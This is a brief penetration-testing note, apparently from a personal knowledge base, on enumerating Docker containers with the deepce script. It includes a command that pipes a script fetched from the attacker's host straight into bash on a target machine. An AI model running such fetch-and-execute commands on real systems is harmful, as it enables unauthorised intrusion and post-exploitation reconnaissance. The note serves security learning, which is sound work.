# Docker Enumeration

## deepce

Deepce is an automated enumeration tool that can be used to scan docker containers, similar to [[Linux Enumeration#Linpeas|Linpeas]].

### Setup

Git repository: [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)

Install on host:

```bash
$ wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
```

### Run

[[Fundamental Skills#Python Webserver|Run a webserver]] on host machine to serve the script.

On target machine:

```bash
$ curl http://[HOST_IP]:[SERVER_PORT]/deepce.sh | bash
```

### Practical Example

Ippsec's [Laboratory Video](https://youtu.be/ozmHeApuSj8?t=1370)